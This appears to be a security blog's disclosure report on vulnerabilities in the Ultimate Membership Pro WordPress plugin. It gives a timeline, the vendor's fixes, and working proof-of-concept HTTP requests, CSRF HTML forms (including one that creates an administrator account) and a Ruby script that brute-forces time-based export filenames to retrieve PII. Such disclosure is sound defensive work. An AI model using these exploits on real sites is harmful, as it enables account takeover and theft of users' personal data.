---
layout: post
title:  "Ultimate Membership Pro Premium WordPress Plugin Recent Vulnerabilities Breakdown"
categories: wpvulndb report
---

### Plugin Information
- Slug: indeed-membership-pro
- Vendor URL: https://codecanyon.net/item/ultimate-membership-pro-wordpress-plugin/12159253
- Affected Versions:
  - < 8.6.1 for Authorisation Issues
  - < 8.6.2 for AJAX CSRF and Insufficient Filename Entropy
  - < 8.7 for CSRF to Delete/Create Accounts

### Related WPVulnDB IDs
- https://wpvulndb.com/vulnerabilities/10061
- https://wpvulndb.com/vulnerabilities/10086
- https://wpvulndb.com/vulnerabilities/10087

### Context

While checking fixes of critical issues in a premium plugin, we stumbled across an insufficient filename entropy where the PHP function `time()` was used to generate a part of the md5 hashed string to form the filename. These files generally contain sensitive data, such as log, PII etc and as it's not the first we see such a mistake, we though it would be a good idea to make a post out of it.

### Lack of Authorisation Checks in AJAX Calls (WPVulnDB [10061](https://wpvulndb.com/vulnerabilities/10061), v < 8.6.1)

On February 3rd, we received a report via the [WPVulnDB submission form](https://wpvulndb.com/submits/new) about multiple critical issues in a premium plugin, `Ultimate Membership Pro` (indeed-membership-pro slug), related to lack of authorisations checks on AJAX calls, allowing low privilege users, such as subscribers, to perform admin actions like generate an export containing PII (username, email address, IP address, User-Agent and so on), as well as generate authentication links by suppling an ID or Username. Furthermore, if an export had already been done by an administrator, the file was publicly accessible with an easily gueesable path.

Even though we were unable to confirm the AJAX issues on the demo blog of the author's plugin at the time (it was later reported that the demo was using an old version of the plugin), the export.xml had already been generated and was publicly accessible. Furthermore, we were pretty confident that the issues were valid due to the submission history of the researcher.

The three PoC below are from the researcher, [Noman Riffat](https://twitter.com/nomanriffat), and require a low priviledge account, such as subsriber (however, due to the plugin's nature, registration is likely to be enabled).

#### PoC to Generate a Report

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: {subscriber cookies}

action=ihc_make_export_file&import_users=1&import_settings=1&import_postmeta=1
```

Which will respond with the URL to the export file, containing PII: http://example.com/wp-content/plugins/indeed-membership-pro/export.xml

The file was then available publicly, and we confirmed its presence on the demo blog of the plugin's author.

#### PoC to Generate Authentication Links

With an Username:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: {subscriber cookies}

action=ihc_generate_direct_link&username=admin
```

With an ID:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: {subscriber cookies}

action=ihc_generate_direct_link_by_uid&uid=1
```

Both requests above will respond with a link which upon opening, lead to direct login without requiring any credentials, e.g http://example.com/?ihc_action=dl&token=94bb1bcba42feb2e19565a44b3d96838fef9e791

The vendor released version 8.6.1, fixing the authorisation checks, however after checking the diff, we (WPScanTeam) found that the fixes were not sufficient.

### Multiple CSRF Issues via AJAX Calls and Insufficient Filename Entropy (WPVulnDB [10086](https://wpvulndb.com/vulnerabilities/10086), v < 8.6.2)

An `indeedIsAdmin()` check was added to all AJAX calls for authorisation, however the calls were still missing CSRF verification. As a result, an attacker could force a logged in administrator to delete users and delete coupons via CSRF attacks on those calls.

#### PoC to Delete the User with ID 1 via CSRF Attack

```
<html>
  <body onload="document.forms[0].submit();">
    <form action="https://example.com/wp-admin/admin-ajax.php" method="POST">
      <input type="hidden" name="action" value="ihc_delete_user_via_ajax" />
      <input type="hidden" name="id" value="1" />
    </form>
  </body>
</html>
```

The export.xml file was now generated with `$filename = md5( time() . rand(1, 10000) . 'export' ) . '.xml’;` (in `admin/main.php`, `ihc_make_export_file()`). Using `time()` here is not random enough, and an attacker could use a CSRF attack to make a logged in admin regenerate a file, record the timestamp and perform a brute force attack against the filename. Once CSRFed, the brute force would take less than 30min (depending on the target response time though), it took maximum 20min in our test environment.

It seemed like the `ihc_make_csv_user_list()` (in utilities.php) called by the AJAX `ihc_return_csv_link()` (in `admin/main.php`) was also affected as once again a time based value was used as a random bit to generate a hashed md5 filename. Other methods may be affected as well.

#### PoC to Regenerate an export via CSRF Attack, and Brute Force its Path

```html
<-- csrf.html --> 
<html>
  <head>
    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
    <meta content="utf-8" http-equiv="encoding">
    <script language="javascript" type="text/javascript" src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
  </head>
  <body>
    <script language="javascript" type="text/javascript">
      jQuery(function ($) {
        $('#attack').click(doCSRF);
        $('#clear').click(function() { $('#output').empty(); });

        function timestamp() { return Math.floor(Date.now() / 1000); }

        function writeToScreen(message) { $('#output').append(message + '<br /><br />'); }

        function brute_force_command(time_before_csrf, time_after_crsf) {
          return 'ruby brute_force.rb -s ' + time_before_csrf + ' -e ' + time_after_crsf + ' --url ' + $('#target').val();
        }

        function doCSRF() {
          time_before_csrf = timestamp();

          var rq = $.ajax({
            type: 'POST',
            url: $('#target').val() + 'wp-admin/admin-ajax.php',
            data: 'action=ihc_make_export_file&import_users=1&import_settings=1&import_postmeta=1',
            xhrFields: { withCredentials: true },
            success: function(data) { writeToScreen('Got link from CSRF response: ' + data); } // In case the server supports arbitrary CORS, unlikely
          })
          // When CORS prevents reading the response
          .fail(function(data) { writeToScreen('Brute Force with ' + brute_force_command(time_before_csrf, timestamp())); });
        }
      });
    </script>
    <input type="text" id="target" size="50" value="https://example.com/" />
    <input type="button" id="attack" value="Execute CSRF" />
    <br /><br />Output:
    <button id="clear">Clear</button>
    <br /> <pre><div id="output"></div></pre>
  </body>
</html>
```

```ruby
# brute_force.rb
require 'typhoeus'
require 'digest'
require 'ruby-progressbar'
require 'thread'
require 'opt_parse_validator'

begin
  parsed_cli = OptParseValidator::OptParser.new.add(
    OptParseValidator::OptString.new(['--url URL', 'The URL of the blog'], required: true),
    OptParseValidator::OptInteger.new(['--start STARTING_TIMESTAMP', '-s', 'The Sarting timestamp'], required: true),
    OptParseValidator::OptInteger.new(['--end ENDING_TIMESTAMP', '-e', 'The Ending timestamp'], required: true),
    OptParseValidator::OptInteger.new(['--threads THREADS', '-t', 'The number of threads to used'], default: 15)
  ).results

  base_url = parsed_cli[:url]
  base_url << '/' unless base_url.end_with?('/')
  base_url << 'wp-content/plugins/indeed-membership-pro/'

  request_options = { proxy: parsed_cli[:proxy] }
rescue OptParseValidator::Error => e
  puts 'Parsing Error: ' + e.message
end

queue = Queue.new

(parsed_cli[:start]..parsed_cli[:end]).each do |time|
  10000.times.to_a.sample(10000).each do |i|
    filename = Digest::MD5.hexdigest("#{time}#{i}export") + '.xml'

    queue.push(base_url + filename)
  end
end

progress_bar = ProgressBar.create(total: queue.size, format: '%t %a <%B> (%c / %C) %P%% %e')
found        = false

begin
  workers = parsed_cli[:threads].times.map do
    Thread.new do
      while !queue.empty? && !found && url = queue.pop(true)
        begin
          res = Typhoeus.head(url, request_options)

          progress_bar.increment unless progress_bar.stopped?
          
          next unless res.code == 200

          progress_bar.log("Found! - #{res.headers['Content-Length']} - #{res.headers['Content-Type']} - #{url}")

          found = true
        rescue StandardError => e
          progress_bar.log("#{url} - #{e.message}")
        end
      end
    end
  end

  workers.map(&:join)
ensure
  progress_bar.stop
end
```

```
% ruby brute_force.rb -s 1581690389 -e 1581690390 --url http://example.com/
Found! - 53622 - application/xml - http://example.com/wp-content/plugins/indeed-membership-pro/9af5f4948d81403426a6c4874d1c4e0a.xml                                       
Progress Time: 00:04:52 <===        > (7266 / 20000) 36.33%  ETA: ??:??:??
```

The previously generated files from `ihc_return_csv_link()` and `ihc_make_export_file()` were not deleted. Even though the  filenames are md5 hashed strings (of non random bit through), leaving them there increase the risk of an attacker guessing them, which would lead to PII being leaked.

We gave the following recommendation to the devs:

- Add CSRF checks on all AJAX calls;
- Use the random_bytes() PHP function to generate the random part of the filenames, instead of a time based one like time();
- Make sure the previously generated exported files are deleted when a new one is created;
- Make sure the export.xml is removed if present in newest version of the plugin.


### Cross-Site Request Forgery allowing Arbitrary Account Deletion and Creation (WPVulnDB [10087](https://wpvulndb.com/vulnerabilities/10087), v < 8.7)

While confirming the fixes for the previous issues, we noticed two CSRF (not via AJAX calls like previously), which could allow arbitrary deletion and creation of accounts, including with the administrator role for the later.

#### PoC to Delete Arbitrary Users via CSRF Attack

```html
<html>
  <body onload="document.forms[0].submit();">
    <form action="https://example.com/wp-admin/admin.php?page=ihc_manage&tab=users" method="POST">
      <input type="hidden" name="ihc_limit" value="25" />
      <input type="hidden" name="delete_users[]" value="5" />
      <input type="hidden" name="delete" value="Delete" />
    </form>
  </body>
</html>
```

#### PoC to Create an Administrator Account via CSRF Attack

```html
<html>
  <!-- Account will not show up in the plugin's users list (because of admin role), but will be in the WP users list -->
 <body onload="document.forms[0].submit();">
    <form action="https://example.com/wp-admin/admin.php?page=ihc_manage&tab=users" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="user_login" value="admin-csrf" />
      <input type="hidden" name="user_email" value="admin-csrf@attacker.com" />
      <input type="hidden" name="first_name" value="Admin" />
      <input type="hidden" name="last_name" value="CSRF" />
      <input type="hidden" name="pass1" value="Passw0rd" />
      <input type="hidden" name="pass2" value="Passw0rd" />
      <input type="hidden" name="role" value="administrator" />
      <input type="hidden" name="ihc_user_levels" value="-1" />
      <input type="hidden" name="ihc_overview_post" value="-1" />
      <input type="hidden" name="Submit" value="Register" />
    </form>
  </body>
</html>
```

Given the recurrent lack of CSRF checks on actions, we recommended the devs to do a review of their plugin to make sure appropriate checks are in place.

### Timeline
- Februaray 1st, 2020 - Researcher Tried to contact devs via email and the comment section on Envato.
- Februrary 3rd, 2020 - Report received via WPVulnDB submission form & Escalated to Envato.
- February 4th, 2020 - Envato Investigating.
- February 4th, 2020 - v8.6.1 released, devs replied (via Envato) that the issues were due to the nulled plugin used by the reasearcher.
- February 7th, 2020 - We confirmed that the issues were valid and not due to a nulled plugin liked the devs claimed. Furthermore, the attempted fixes were not sufficient enough and Envato has been notified again along with more details and piece of vulnerable code.
- February 8th, 2020 - Envato replied that the issues have been verified and the devs have been notified.
- Febraury 13th, 2020 - v8.6.2 released.
- Febraury 14th, 2020 - Envato reaching to notify us of the update.
- February 17th, 2020 - Reply to Envato after confirming the issues have been remediated. Also notified them of two CSRF  identified while checking the fixes.
- February 22nd, 2020 - v8.7 released, fixing the two additional CSRF found. Other CSRF checks have been put in place as well.
- March 6th, 2020 - Release of all PoC and this report

### Note
There was another sensitive file with the same behaviour as the export.xml (publicly accessible, insufficient entropy and so on). Even though this has not been detailed in this report, it was fixed.

### Thanks
- Envato, for the quick response and escalation. Even though they had a large amount of tickets (and response time could take up to 7 days), we got a response in 24h and a potential fix 3 days after by the plugin's devs.
- The original researcher, [Noman Riffat](https://twitter.com/nomanriffat)
